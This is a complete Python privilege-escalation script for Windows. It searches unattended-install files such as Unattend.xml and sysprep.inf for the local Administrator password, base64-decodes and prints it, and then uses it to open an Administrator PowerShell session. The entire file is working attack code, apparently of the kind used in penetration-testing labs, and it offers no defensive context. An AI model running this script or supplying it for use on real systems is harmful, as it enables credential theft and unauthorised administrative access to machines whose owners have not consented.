import os
import re
import base64
import subprocess

# Common unattended install file locations
locations = [
    "C:\\Windows\\Panther\\Unattend.xml",
    "C:\\Windows\\System32\\sysprep\\sysprep.inf",
    "C:\\Windows\\Panther\\Unattended.xml",
    "C:\\Autounattend.xml"
]

password_pattern = re.compile(r"<AdministratorPassword>.*?<Value>(.*?)</Value>", re.DOTALL)

def extract_password(file_path):
    with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
        content = f.read()
    match = password_pattern.search(content)
    if match:
        return match.group(1).strip()
    return None

def decode_password(pwd):
    try:
        # Fix base64 padding
        missing_padding = len(pwd) % 4
        if missing_padding != 0:
            pwd += '=' * (4 - missing_padding)

        decoded = base64.b64decode(pwd).decode('utf-8')
        print(f"[+] Base64 decoded password: {decoded}")
        return decoded
    except Exception as e:
        print(f"[!] Base64 decoding failed: {e}")
        return pwd

def open_admin_shell(username, password):
    ps_script = f'''
    $pass = ConvertTo-SecureString "{password}" -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential("{username}", $pass)
    Start-Process powershell -Credential $cred -ArgumentList '-NoExit' -Wait
    '''

    print("[*] Launching visible Administrator PowerShell session...")
    subprocess.run(["powershell", "-Command", ps_script], shell=True)

def main():
    for file_path in locations:
        if os.path.exists(file_path):
            print(f"[+] Found file: {file_path}")
            encoded_pwd = extract_password(file_path)
            if encoded_pwd:
                print(f"[+] Extracted password (encoded): {encoded_pwd}")
                password = decode_password(encoded_pwd)
                print(f"[+] Decoded password: {password}")
                print("[*] Trying to start session as Administrator...")
                open_admin_shell("Administrator", password)
                return
            else:
                print(f"[-] No password found in {file_path}")
    print("[-] No unattended install files found or no password present.")

if __name__ == "__main__":
    main()
